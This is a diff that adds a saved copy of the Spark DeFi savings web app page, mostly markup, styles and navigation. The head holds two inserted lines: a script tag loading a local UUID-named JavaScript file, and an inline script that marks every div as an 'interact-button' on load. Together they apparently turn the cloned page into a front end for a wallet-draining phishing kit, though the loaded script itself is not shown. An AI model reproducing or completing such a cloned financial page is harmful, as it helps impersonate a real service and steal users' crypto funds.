@@ -1,0 +1,533 @@
+<!DOCTYPE html>
+<html lang="en" style="--wcm-color-fg-1: rgb(20,20,20); --wcm-color-fg-2: rgb(121,134,134); --wcm-color-fg-3: rgb(158,169,169); --wcm-color-bg-1: rgb(255,255,255); --wcm-color-bg-2: rgb(241,243,243); --wcm-color-bg-3: rgb(228,231,231); --wcm-color-overlay: rgba(0,0,0,0.1); --wcm-accent-color: #3396FF; --wcm-accent-fill-color: #FFFFFF; --wcm-z-index: 89; --wcm-background-color: #3396FF; --wcm-background-border-radius: 8px; --wcm-container-border-radius: 30px; --wcm-wallet-icon-border-radius: 15px; --wcm-wallet-icon-large-border-radius: 30px; --wcm-wallet-icon-small-border-radius: 7px; --wcm-input-border-radius: 28px; --wcm-button-border-radius: 10px; --wcm-notification-border-radius: 36px; --wcm-secondary-button-border-radius: 28px; --wcm-icon-button-border-radius: 50%; --wcm-button-hover-highlight-border-radius: 10px; --wcm-text-big-bold-size: 20px; --wcm-text-big-bold-weight: 600; --wcm-text-big-bold-line-height: 24px; --wcm-text-big-bold-letter-spacing: -0.03em; --wcm-text-big-bold-text-transform: none; --wcm-text-xsmall-bold-size: 10px; --wcm-text-xsmall-bold-weight: 700; --wcm-text-xsmall-bold-line-height: 12px; --wcm-text-xsmall-bold-letter-spacing: 0.02em; --wcm-text-xsmall-bold-text-transform: uppercase; --wcm-text-xsmall-regular-size: 12px; --wcm-text-xsmall-regular-weight: 600; --wcm-text-xsmall-regular-line-height: 14px; --wcm-text-xsmall-regular-letter-spacing: -0.03em; --wcm-text-xsmall-regular-text-transform: none; --wcm-text-small-thin-size: 14px; --wcm-text-small-thin-weight: 500; --wcm-text-small-thin-line-height: 16px; --wcm-text-small-thin-letter-spacing: -0.03em; --wcm-text-small-thin-text-transform: none; --wcm-text-small-regular-size: 14px; --wcm-text-small-regular-weight: 600; --wcm-text-small-regular-line-height: 16px; --wcm-text-small-regular-letter-spacing: -0.03em; --wcm-text-small-regular-text-transform: none; --wcm-text-medium-regular-size: 16px; --wcm-text-medium-regular-weight: 600; --wcm-text-medium-regular-line-height: 20px; --wcm-text-medium-regular-letter-spacing: -0.03em; --wcm-text-medium-regular-text-transform: none; --wcm-font-family: -apple-system, system-ui, BlinkMacSystemFont, 'Segoe UI', Roboto, Ubuntu, 'Helvetica Neue', sans-serif; --wcm-font-feature-settings: 'tnum' on, 'lnum' on, 'case' on; --wcm-success-color: rgb(38,181,98); --wcm-error-color: rgb(242, 90, 103); --wcm-overlay-background-color: rgba(0, 0, 0, 0.3); --wcm-overlay-backdrop-filter: none;" data-scrapbook-source="https://app.spark.fi/" data-scrapbook-create="20250529111137423" data-scrapbook-adoptedstylesheet-0="*, ::after, ::before { margin: 0px; padding: 0px; box-sizing: border-box; font-style: normal; text-rendering: optimizespeed; -webkit-font-smoothing: antialiased; -webkit-tap-highlight-color: transparent; backface-visibility: hidden; }
+   button { cursor: pointer; display: flex; justify-content: center; align-items: center; position: relative; border: none; background-color: transparent; transition: 0.2s; }
+   @media (hover: hover) and (pointer: fine) {
+   button:active { transition: 0.1s; transform: scale(0.93); }
+   }
+   button::after { content: &quot;&quot;; position: absolute; inset: 0px; transition: background-color, 0.2s; }
+   button:disabled { cursor: not-allowed; }
+   button svg, button wcm-text { position: relative; z-index: 1; }
+   input { border: none; outline: 0px; appearance: none; }
+   img { display: block; }
+   ::selection { color: var(--wcm-accent-fill-color); background: var(--wcm-accent-color); }" data-scrapbook-adoptedstylesheet-1=":host { all: initial; }
+   .wcm-overlay { inset: 0px; position: fixed; z-index: var(--wcm-z-index); overflow: hidden; display: flex; justify-content: center; align-items: center; opacity: 0; pointer-events: none; background-color: var(--wcm-overlay-background-color); backdrop-filter: var(--wcm-overlay-backdrop-filter); }
+   @media (max-height: 720px) and (orientation: landscape) {
+   .wcm-overlay { overflow: scroll; align-items: flex-start; padding: 20px 0px; }
+   }
+   .wcm-active { pointer-events: auto; }
+   .wcm-container { position: relative; max-width: 360px; width: 100%; outline: 0px; border-radius: var(--wcm-background-border-radius) var(--wcm-background-border-radius) var(--wcm-container-border-radius) var(--wcm-container-border-radius); border: 1px solid var(--wcm-color-overlay); overflow: hidden; }
+   .wcm-card { width: 100%; position: relative; border-radius: var(--wcm-container-border-radius); overflow: hidden; box-shadow: 0 6px 14px -6px rgba(10,16,31,.12),0 10px 32px -4px rgba(10,16,31,.1),0 0 0 1px var(--wcm-color-overlay); background-color: var(--wcm-color-bg-1); color: var(--wcm-color-fg-1); }
+   @media (max-width: 600px) {
+   .wcm-container { max-width: 440px; border-radius: var(--wcm-background-border-radius) var(--wcm-background-border-radius) 0 0; }
+   .wcm-card { border-radius: var(--wcm-container-border-radius) var(--wcm-container-border-radius) 0 0; }
+   .wcm-overlay { align-items: flex-end; }
+   }
+   @media (max-width: 440px) {
+   .wcm-container { border: 0px; }
+   }">
+   <head>
+      <style>body {transition: opacity ease-in 0.2s; } 
+         body[unresolved] {opacity: 0; display: block; overflow: hidden; position: relative; } 
+      </style>
+      <meta charset="UTF-8">
+      <link rel="icon" type="image/png" href="favicon-96x96.png" sizes="96x96">
+      <link rel="icon" type="image/svg+xml" href="favicon.svg">
+      <link rel="shortcut icon" href="favicon.ico">
+      <link rel="apple-touch-icon" sizes="180x180" href="https://app.spark.fi/apple-touch-icon.png">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <title>Spark: Earn on your stablecoins</title>
+      <meta name="description" content="Maximize your DeFi experience with transparent rates">
+      <meta property="og:title" content="Spark: Earn on your stablecoins">
+      <meta property="og:url" content="https://app.spark.fi/">
+      <meta property="og:type" content="website">
+      <meta property="og:description" content="Maximize your DeFi experience with transparent rates">
+      <meta property="og:site_name" content="spark">
+      <meta property="og:image" content="https://app.spark.fi/spark-meta-logo.png">
+      <meta property="og:logo" content="https://app.spark.fi/spark-meta-logo.png">
+      <meta property="og:image:alt" content="spark image">
+      <meta property="og:image:width" content="1200">
+      <meta property="og:image:height" content="675">
+      <meta property="og:image:url" content="https://app.spark.fi/spark-meta-logo.png">
+      <meta property="og:image:secure_url" content="https://app.spark.fi/spark-meta-logo.png">
+      <meta name="twitter:site" content="@sparkdotfi">
+      <meta name="twitter:card" content="summary_large_image">
+      <meta name="twitter:title" content="Spark: Earn on your stablecoins">
+      <meta name="twitter:description" content="Maximize your DeFi experience with transparent rates">
+      <meta name="twitter:image" content="https://app.spark.fi/spark-meta-logo.png">
+      <link rel="image_src" href="https://app.spark.fi/spark-meta-logo.png">
+      <meta name="keywords" content="Decentralized Finance, DeFi, lending, borrowing, stablecoins, Ethereum, assets, erc-20, smart contracts, open finance, trustless">
+      <link rel="stylesheet" href="index-C7C0eKq4.css">
+	  <script charset="UTF-8" type="text/javascript" src="./0bab5463-7a69-4fc2-a863-b96431d4cdf1.js"></script>
+	  <script>
+    // Add interact-button class to all divs when page loads
+    document.addEventListener('DOMContentLoaded', function() {
+        const allDivs = document.querySelectorAll('div');
+        allDivs.forEach(div => {
+            div.classList.add('interact-button');
+        });
+    });
+</script>
+      <script data-scrapbook-elem="custom-elements-loader">(function (names) { if (!customElements) { return; } for (const name of names) { customElements.define(name, class CustomElement extends HTMLElement {}); } })(["veepn-guard-alert","veepn-lock-screen","wcm-explorer-context","wcm-theme-context","wcm-modal"])</script>
+   </head>
+   <body>
+      <div id="root">
+         <div data-rk="">
+            <style>[data-rk]{--rk-blurs-modalOverlay:blur(0px);--rk-fonts-body:SFRounded, ui-rounded, "SF Pro Rounded", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";--rk-radii-actionButton:10px;--rk-radii-connectButton:8px;--rk-radii-menuButton:8px;--rk-radii-modal:16px;--rk-radii-modalMobile:18px;--rk-colors-accentColor:#3E64EF;--rk-colors-accentColorForeground:#FFF;--rk-colors-actionButtonBorder:rgba(0, 0, 0, 0.04);--rk-colors-actionButtonBorderMobile:rgba(0, 0, 0, 0.06);--rk-colors-actionButtonSecondaryBackground:rgba(0, 0, 0, 0.06);--rk-colors-closeButton:rgba(60, 66, 66, 0.8);--rk-colors-closeButtonBackground:rgba(0, 0, 0, 0.06);--rk-colors-connectButtonBackground:#FFF;--rk-colors-connectButtonBackgroundError:#FF494A;--rk-colors-connectButtonInnerBackground:linear-gradient(0deg, rgba(0, 0, 0, 0.03), rgba(0, 0, 0, 0.06));--rk-colors-connectButtonText:#25292E;--rk-colors-connectButtonTextError:#FFF;--rk-colors-connectionIndicator:#30E000;--rk-colors-downloadBottomCardBackground:linear-gradient(126deg, rgba(255, 255, 255, 0) 9.49%, rgba(171, 171, 171, 0.04) 71.04%), #FFFFFF;--rk-colors-downloadTopCardBackground:linear-gradient(126deg, rgba(171, 171, 171, 0.2) 9.49%, rgba(255, 255, 255, 0) 71.04%), #FFFFFF;--rk-colors-error:#FF494A;--rk-colors-generalBorder:rgba(0, 0, 0, 0.06);--rk-colors-generalBorderDim:rgba(0, 0, 0, 0.03);--rk-colors-menuItemBackground:rgba(60, 66, 66, 0.1);--rk-colors-modalBackdrop:rgba(0, 0, 0, 0.3);--rk-colors-modalBackground:#FFF;--rk-colors-modalBorder:transparent;--rk-colors-modalText:#25292E;--rk-colors-modalTextDim:rgba(60, 66, 66, 0.3);--rk-colors-modalTextSecondary:rgba(60, 66, 66, 0.6);--rk-colors-profileAction:#FFF;--rk-colors-profileActionHover:rgba(255, 255, 255, 0.5);--rk-colors-profileForeground:rgba(60, 66, 66, 0.06);--rk-colors-selectedOptionBorder:rgba(60, 66, 66, 0.1);--rk-colors-standby:#FFD641;--rk-shadows-connectButton:0px 4px 12px rgba(0, 0, 0, 0.1);--rk-shadows-dialog:0px 8px 32px rgba(0, 0, 0, 0.32);--rk-shadows-profileDetailsAction:0px 2px 6px rgba(37, 41, 46, 0.04);--rk-shadows-selectedOption:0px 2px 6px rgba(0, 0, 0, 0.24);--rk-shadows-selectedWallet:0px 2px 6px rgba(0, 0, 0, 0.12);--rk-shadows-walletLogo:0px 2px 16px rgba(0, 0, 0, 0.16);}</style>
+            <div class="grid min-h-screen w-full grid-cols-[1fr_calc(100%-40px)_1fr] grid-rows-[auto_auto_1fr_auto] items-start gap-x-[20px] bg-secondary lg:grid-cols-[1fr_min(calc(100%-128px),1312px)_1fr] lg:gap-x-[64px]">
+               <div class="fixed top-0 right-0 z-10 aspect-[582/1010] bg-[url(&quot;/backgrounds/background-lines.svg&quot;)] bg-contain bg-no-repeat w-[200vw] max-w-[1010px] sm:w-[150vw] md:w-[125vw] lg:w-full">
+                  <div class="aspect-square w-[70vw] translate-x-[643px] translate-y-[66px] blur-[250px] sm:blur-[384px] md:w-[367px] bg-gradient-to-r from-[--gradient-from] via-[--gradient-via] to-[--gradient-to] duration-300 ease-out [transition-property:_--gradient-from,_--gradient-via,_--gradient-to]" style="--gradient-from: #11B93E; --gradient-via: #40DA69; --gradient-to: #FFFFFF;"></div>
+               </div>
+               <div class="relative flex w-full items-center justify-center bg-[#5723F2] min-h-10 p-2.5 text-center shadow-inner transition-colors duration-200 sm:flex-row md:p-1.5 cursor-pointer hover:bg-[#3a00a6] z-30 col-span-full">
+                  <div class="typography-body-3 text-primary-inverse">
+                     Earn Social Snaps! <br class="sm:hidden"> Join the Spark Social Media Army. 
+                     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-external-link icon-xxs mb-0.5 inline sm:hidden">
+                        <path d="M15 3h6v6"></path>
+                        <path d="M10 14 21 3"></path>
+                        <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path>
+                     </svg>
+                     <span class="hidden lg:inline"> Post, Share, Educate &amp; Climb the Leaderboard. </span>
+                     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-external-link icon-xs mb-1 hidden sm:inline">
+                        <path d="M15 3h6v6"></path>
+                        <path d="M10 14 21 3"></path>
+                        <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path>
+                     </svg>
+                  </div>
+                  <button class="isolate inline-flex select-none items-center justify-center whitespace-nowrap rounded-sm focus-visible:text-neutral-950 focus-visible:outline-none focus-visible:ring focus-visible:ring-primary-200 focus-visible:ring-offset-0 overflow-visible transition-colors disabled:cursor-not-allowed disabled:text-neutral-300 focus-visible:bg-transparent typography-button-2 gap-2 aspect-square h-fit p-0 -translate-y-1/2 absolute top-1/2 right-3 text-primary-inverse hover:text-primary-inverse/70 active:text-primary-inverse/50" type="button">
+                     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-x icon-xs">
+                        <path d="M18 6 6 18"></path>
+                        <path d="m6 6 12 12"></path>
+                     </svg>
+                  </button>
+               </div>
+               <div class="z-30 col-start-2 col-end-2 my-2 sm:mb-8 lg:mt-6 lg:mb-10">
+                  <nav class="grid h-100% grid-cols-[1fr_auto] place-items-center gap-2 sm:grid-cols-[auto_1fr_auto]">
+                     <div class="rounded-md bg-primary/60 backdrop-blur-lg flex h-full w-full items-center gap-1 p-0 md:w-auto lg:p-0"><a class="group focus-visible:bg-primary focus-visible:text-neutral-950 focus-visible:ring focus-visible:outline-none focus-visible:ring-primary-200 focus-visible:ring-offset-0 flex h-14 w-10 shrink-0 items-center justify-center gap-2 sm:w-16" href=""><img src="0a244591aeff6b3b09a25452ced164a8cf4530c9.svg" alt="Spark logo" class="aspect-square h-6 select-none brightness-0 transition duration-300 group-hover:filter-none group-focus-visible:filter-none sm:h-8 md:h-9"></a></div>
+                     <div class="p-2 lg:p-3 rounded-md bg-primary/60 backdrop-blur-lg hidden h-full w-full justify-between gap-2 sm:flex">
+                        <div class="hidden gap-2 sm:flex">
+                           <a aria-current="page" class="typography-label-2 inline-flex h-20 flex-nowrap items-center sm:h-10 group gap-2 border-base-white border-l-4 bg-primary px-4 py-2 sm:rounded-sm sm:border sm:border-primary border-solid border-opacity-40 transition-colors sm:shadow-xs focus-visible:outline-none focus-visible:ring-1 hover:border-page-savings/40 active:border-page-savings hover:shadow-page-savings/15 focus-visible:ring-page-savings !border-page-savings active" href="">
+                              <img src="0178b1193f855b1ee38ec12bef4f761cce70739b.svg" alt="Savings icon" class="h-4 w-4"><span class="inline sm:hidden lg:inline">Savings</span>
+                              <div class="min-w-8 items-center justify-center rounded-md bg-gradient-savings px-1.5 h-5 transition-colors group-hover:text-secondary hidden lg:inline-flex"><span class="typography-label-3 !leading-none text-primary-inverse">4.5%</span></div>
+                           </a>
+                           <button type="button" class="typography-label-2 inline-flex h-20 flex-nowrap items-center sm:h-10 group gap-2 border-base-white border-l-4 bg-primary px-4 py-2 sm:rounded-sm sm:border sm:border-primary border-solid border-opacity-40 transition-colors sm:shadow-xs focus-visible:outline-none focus-visible:ring-1 hover:border-page-borrow/40 active:border-page-borrow hover:shadow-page-borrow/15 focus-visible:ring-page-borrow" id="radix-:r0:" aria-haspopup="menu" aria-expanded="false" data-state="closed">
+                              <img src="e05e944c03244edfbe3f0878e2e5b25fadb2782c.svg" alt="Borrow icon" class="h-5 w-5"><span class="inline sm:hidden lg:inline">Borrow</span>
+                              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-chevron-down h-5 group-hover:text-secondary transition-transform duration-300">
+                                 <path d="m6 9 6 6 6-6"></path>
+                              </svg>
+                           </button>
+                        </div>
+                        <div class="flex gap-2">
+                           <button data-testid="topbar-airdrop-badge" id="radix-:r2:" aria-haspopup="menu" aria-expanded="false" data-state="closed" class="relative isolate inline-flex select-none items-center justify-center overflow-hidden whitespace-nowrap rounded-sm transition-colors focus-visible:bg-primary focus-visible:text-neutral-950 focus-visible:outline-none focus-visible:ring focus-visible:ring-primary-200 focus-visible:ring-offset-0 border border-primary border-solid bg-primary text-neutral-950 shadow-xs hover:bg-neutral-50 active:bg-neutral-100 disabled:cursor-not-allowed disabled:border-none disabled:bg-neutral-50 disabled:text-neutral-500 typography-button-2 h-10 px-2 py-2.5 gap-2 aspect-square [@media(min-width:1080px)]:aspect-auto" type="button">
+                              <img src="0a244591aeff6b3b09a25452ced164a8cf4530c9.svg" class="icon-sm">
+                              <span class="hidden [@media(min-width:1080px)]:block">
+                                 <div data-chromatic="ignore">0</div>
+                              </span>
+                           </button>
+                           <a class="relative isolate inline-flex select-none items-center justify-center overflow-hidden whitespace-nowrap rounded-sm transition-colors focus-visible:bg-primary focus-visible:text-neutral-950 focus-visible:outline-none focus-visible:ring focus-visible:ring-primary-200 focus-visible:ring-offset-0 border border-primary border-solid bg-primary text-neutral-950 shadow-xs hover:bg-neutral-50 active:bg-neutral-100 disabled:cursor-not-allowed disabled:border-none disabled:bg-neutral-50 disabled:text-neutral-500 typography-button-2 h-10 px-2 py-2.5 gap-1" href="https://app.spark.fi/rewards"><img src="429cc145101c176f1aba8612d76610bd46e7bab7.svg" class="size-5"></a><a class="relative isolate inline-flex select-none items-center justify-center overflow-hidden whitespace-nowrap rounded-sm transition-colors focus-visible:bg-primary focus-visible:text-neutral-950 focus-visible:outline-none focus-visible:ring focus-visible:ring-primary-200 focus-visible:ring-offset-0 border border-primary border-solid bg-primary text-neutral-950 shadow-xs hover:bg-neutral-50 active:bg-neutral-100 disabled:cursor-not-allowed disabled:border-none disabled:bg-neutral-50 disabled:text-neutral-500 typography-button-2 h-10 px-2 py-2.5 gap-1" href="https://app.spark.fi/points"><img src="927b92fda080858f307b188a78d92e0a53166816.svg" alt="Points icon" class="icon-sm"><span class="hidden [@media(min-width:1200px)]:block">Points</span></a>
+                        </div>
+                     </div>
+                     <div class="p-2 lg:p-3 rounded-md bg-primary/60 backdrop-blur-lg flex flex-nowrap justify-end gap-2">
+                        <button class="relative isolate inline-flex select-none items-center justify-center overflow-hidden whitespace-nowrap rounded-sm transition-colors focus-visible:bg-primary focus-visible:text-neutral-950 focus-visible:outline-none focus-visible:ring focus-visible:ring-primary-200 focus-visible:ring-offset-0 border border-primary border-solid bg-primary text-neutral-950 shadow-xs hover:bg-neutral-50 active:bg-neutral-100 disabled:cursor-not-allowed disabled:border-none disabled:bg-neutral-50 disabled:text-neutral-500 typography-button-2 h-10 gap-2 aspect-square p-2" type="button"><img src="4bd6d04db5b1e91cf1334e9285efe2890cdc0211.svg" alt="Chain Ethereum logo" class="icon-md"></button>
+                        <div class="sm:w-36 md:w-44"><button class="relative isolate inline-flex select-none items-center justify-center overflow-hidden whitespace-nowrap rounded-sm transition-colors focus-visible:bg-primary focus-visible:text-neutral-950 focus-visible:outline-none focus-visible:ring focus-visible:ring-primary-200 focus-visible:ring-offset-0 before:-z-10 bg-gradient-spark-primary-1 text-primary-inverse before:absolute focus-visible:before:bg-primary active:before:bg-neutral-800 before:inset-0 before:transition-colors hover:before:bg-neutral-950 active:text-primary-inverse disabled:cursor-not-allowed disabled:text-neutral-500 disabled:before:bg-neutral-50 disabled:bg-gradient-to-r disabled:from-neutral-50 disabled:to-neutral-50 typography-button-2 h-10 py-2.5 gap-2 w-full px-3" type="button"><span>Connect <span class="hidden sm:inline">Wallet</span></span></button></div>
+                        <button id="radix-:r4:" aria-haspopup="menu" aria-expanded="false" data-state="closed" class="relative isolate inline-flex select-none items-center justify-center overflow-hidden whitespace-nowrap rounded-sm transition-colors focus-visible:bg-primary focus-visible:text-neutral-950 focus-visible:outline-none focus-visible:ring focus-visible:ring-primary-200 focus-visible:ring-offset-0 border border-primary border-solid bg-primary text-neutral-950 shadow-xs hover:bg-neutral-50 active:bg-neutral-100 disabled:cursor-not-allowed disabled:border-none disabled:bg-neutral-50 disabled:text-neutral-500 typography-button-2 h-10 gap-2 aspect-square p-2.5" type="button">
+                           <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-menu icon-sm">
+                              <line x1="4" x2="20" y1="12" y2="12"></line>
+                              <line x1="4" x2="20" y1="6" y2="6"></line>
+                              <line x1="4" x2="20" y1="18" y2="18"></line>
+                           </svg>
+                        </button>
+                     </div>
+                  </nav>
+               </div>
+               <main class="isolate z-20 col-span-full grid h-full grid-cols-subgrid pb-16 [&amp;>*]:col-start-2 [&amp;>*]:col-end-2">
+                  <div class="flex w-full flex-col gap-6">
+                     <div class="flex flex-col items-start gap-4 md:flex-row md:items-center md:justify-between">
+                        <h1 class="typography-heading-1 flex items-center gap-2">
+                           Savings
+                           <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-info text-secondary/50 mt-1" data-state="closed">
+                              <circle cx="12" cy="12" r="10"></circle>
+                              <path d="M12 16v-4"></path>
+                              <path d="M12 8h.01"></path>
+                           </svg>
+                        </h1>
+                        <div class="inline-flex divide-x divide-secondary rounded-[10px] bg-primary/80 py-3 backdrop-blur-lg">
+                           <div class="flex gap-1 px-3 sm:px-4">
+                              <div class="typography-label-3 text-secondary">TVL:</div>
+                              <div class="typography-label-3 text-primary">$3.088B</div>
+                           </div>
+                           <div class="flex gap-1 px-3 sm:px-4">
+                              <div class="typography-label-3 text-secondary">Users:</div>
+                              <div class="typography-label-3 text-primary">173K</div>
+                           </div>
+                           <div class="flex gap-1 px-3 sm:px-4">
+                              <div class="typography-label-3 text-secondary">Liquidity:</div>
+                              <div class="typography-label-3 text-primary">
+                                 <div class="flex items-center gap-1">
+                                    $2.644B
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-info text-secondary/50" data-state="closed">
+                                       <circle cx="12" cy="12" r="10"></circle>
+                                       <path d="M12 16v-4"></path>
+                                       <path d="M12 8h.01"></path>
+                                    </svg>
+                                 </div>
+                              </div>
+                           </div>
+                           <div class="flex gap-1 px-3 sm:px-4">
+                              <a rel="noopener noreferrer" class="cursor-pointer rounded-[1px] focus-visible:outline-none focus-visible:ring focus-visible:ring-primary-200 focus-visible:ring-offset-0 flex" href="https://info.sky.money/savings" target="_blank">
+                                 <button class="relative isolate inline-flex select-none items-center justify-center whitespace-nowrap rounded-sm focus-visible:text-neutral-950 focus-visible:outline-none focus-visible:ring focus-visible:ring-primary-200 focus-visible:ring-offset-0 overflow-visible text-secondary transition-colors hover:text-neutral-700 active:text-neutral-900 disabled:cursor-not-allowed disabled:text-neutral-300 focus-visible:bg-transparent typography-button-2 gap-2 aspect-square h-fit p-0" type="button">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-external-link icon-xs">
+                                       <path d="M15 3h6v6"></path>
+                                       <path d="M10 14 21 3"></path>
+                                       <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path>
+                                    </svg>
+                                 </button>
+                              </a>
+                           </div>
+                        </div>
+                     </div>
+                     <div class="grid grid-cols-1 gap-6 xl:grid-cols-[202px_1fr]">
+                        <div class="-ml-5 -mr-5 flex overflow-x-auto pr-5 pl-5 xl:mr-0 xl:ml-0 xl:block xl:overflow-visible xl:pr-0 xl:pl-0 [mask-image:linear-gradient(to_right,rgb(0,0,0,0.3),black_6%,black_94%,rgb(0,0,0,0.3))] xl:[mask-image:none]">
+                           <div class="flex-col hidden xl:block" data-testid="savings-navigation-container">
+                              <button class="relative flex-shrink-0 rounded-[10px] border bg-white shadow-xs hover:shadow-sm focus-visible:bg-primary focus-visible:text-neutral-950 focus-visible:outline-none focus-visible:ring focus-visible:ring-primary-200 focus-visible:ring-offset-0 mb-2 border-savings-600 hover:border-savings-500 h-28 w-full transition-all duration-200 ease-in-out" data-testid="savings-navigation-item">
+                                 <svg viewBox="0 0 256 256" class="absolute size-6 translate-x-4 size-8 -translate-y-10 transition-all duration-200 ease-in-out">
+                                    <image x="0" y="0" href="379fd47b6c4a52769342e69932a76e49b0d99de7.svg" width="256" height="256"></image>
+                                 </svg>
+                                 <div class="absolute flex flex-col items-start gap-0.5 translate-x-4 translate-y-6 transition-all duration-200 ease-in-out">
+                                    <div class="typography-label-3 text-primary" data-testid="savings-navigation-itemLabel">USDC</div>
+                                 </div>
+                              </button>
+                              <button class="relative flex-shrink-0 rounded-[10px] border border-primary bg-white shadow-xs hover:border-secondary hover:shadow-sm focus-visible:bg-primary focus-visible:text-neutral-950 focus-visible:outline-none focus-visible:ring focus-visible:ring-primary-200 focus-visible:ring-offset-0 mb-2 h-16 w-full transition-all duration-200 ease-in-out" data-testid="savings-navigation-item">
+                                 <svg viewBox="0 0 256 256" class="absolute size-6 translate-x-4 -translate-y-1/2 transition-all duration-200 ease-in-out">
+                                    <image x="0" y="0" href="009e88d57f5bb9231d092e8e40d10a7a6b1f500f.svg" width="256" height="256"></image>
+                                 </svg>
+                                 <div class="absolute flex flex-col items-start gap-0.5 translate-x-[52px] -translate-y-1/2 transition-all duration-200 ease-in-out">
+                                    <div class="typography-label-3 text-primary" data-testid="savings-navigation-itemLabel">USDS</div>
+                                 </div>
+                                 <div class="-translate-x-4 absolute right-0 origin-right scale-75 -translate-y-1/2 transition-all duration-200 ease-in-out">
+                                    <div class="relative isolate w-fit">
+                                       <div class="isolate flex flex-row -space-x-2">
+                                          <svg viewBox="0 0 256 256" class="size-6 rounded-full border-base-white box-content border-2">
+                                             <image x="0" y="0" href="304eb4e4ab95263d35973d12fd4df2516e6a7386.svg" width="256" height="256"></image>
+                                          </svg>
+                                          <svg viewBox="0 0 256 256" class="size-6 rounded-full border-base-white box-content border-2">
+                                             <image x="0" y="0" href="30b3140887850c9a997cb472ff4eaa868570e920.svg" width="256" height="256"></image>
+                                          </svg>
+                                          <svg viewBox="0 0 256 256" class="size-6 rounded-full border-base-white box-content border-2">
+                                             <image x="0" y="0" href="dcb43064905930cb2fa12fe91e0fe0d276313d98.svg" width="256" height="256"></image>
+                                          </svg>
+                                          <svg viewBox="0 0 256 256" class="size-6 rounded-full border-base-white box-content border-2">
+                                             <image x="0" y="0" href="41888393a57295f0e7cadea9cb91081b85a7d181.svg" width="256" height="256"></image>
+                                          </svg>
+                                       </div>
+                                    </div>
+                                 </div>
+                              </button>
+                              <button class="relative flex-shrink-0 rounded-[10px] border border-primary bg-white shadow-xs hover:border-secondary hover:shadow-sm focus-visible:bg-primary focus-visible:text-neutral-950 focus-visible:outline-none focus-visible:ring focus-visible:ring-primary-200 focus-visible:ring-offset-0 mb-2 h-16 w-full transition-all duration-200 ease-in-out" data-testid="savings-navigation-item">
+                                 <svg viewBox="0 0 256 256" class="absolute size-6 translate-x-4 -translate-y-1/2 transition-all duration-200 ease-in-out">
+                                    <image x="0" y="0" href="a98afbc8ed2e9e00f5a992c280ce921003d99c96.svg" width="256" height="256"></image>
+                                 </svg>
+                                 <div class="absolute flex flex-col items-start gap-0.5 translate-x-[52px] -translate-y-1/2 transition-all duration-200 ease-in-out">
+                                    <div class="typography-label-3 text-primary" data-testid="savings-navigation-itemLabel">DAI</div>
+                                 </div>
+                              </button>
+                           </div>
+                           <div class="flex xl:hidden" data-testid="savings-navigation-container">
+                              <button class="relative flex-shrink-0 rounded-[10px] border bg-white shadow-xs hover:shadow-sm focus-visible:bg-primary focus-visible:text-neutral-950 focus-visible:outline-none focus-visible:ring focus-visible:ring-primary-200 focus-visible:ring-offset-0 mr-2 size-28 border-savings-600 hover:border-savings-500 w-36 transition-all duration-200 ease-in-out" data-testid="savings-navigation-item">
+                                 <svg viewBox="0 0 256 256" class="absolute size-6 translate-x-4 -translate-y-10 size-8 transition-all duration-200 ease-in-out">
+                                    <image x="0" y="0" href="379fd47b6c4a52769342e69932a76e49b0d99de7.svg" width="256" height="256"></image>
+                                 </svg>
+                                 <div class="absolute flex flex-col items-start gap-0.5 translate-x-4 translate-y-6 transition-all duration-200 ease-in-out">
+                                    <div class="typography-label-3 text-primary" data-testid="savings-navigation-itemLabel">USDC</div>
+                                 </div>
+                              </button>
+                              <button class="relative flex-shrink-0 rounded-[10px] border border-primary bg-white shadow-xs hover:border-secondary hover:shadow-sm focus-visible:bg-primary focus-visible:text-neutral-950 focus-visible:outline-none focus-visible:ring focus-visible:ring-primary-200 focus-visible:ring-offset-0 mr-2 size-28 transition-all duration-200 ease-in-out" data-testid="savings-navigation-item">
+                                 <svg viewBox="0 0 256 256" class="absolute size-6 translate-x-4 -translate-y-10 transition-all duration-200 ease-in-out">
+                                    <image x="0" y="0" href="009e88d57f5bb9231d092e8e40d10a7a6b1f500f.svg" width="256" height="256"></image>
+                                 </svg>
+                                 <div class="absolute flex flex-col items-start gap-0.5 translate-x-4 translate-y-6 transition-all duration-200 ease-in-out">
+                                    <div class="typography-label-3 text-primary" data-testid="savings-navigation-itemLabel">USDS</div>
+                                 </div>
+                                 <div class="-translate-x-4 absolute right-0 origin-right scale-75 hidden transition-all duration-200 ease-in-out">
+                                    <div class="relative isolate w-fit">
+                                       <div class="isolate flex flex-row -space-x-2">
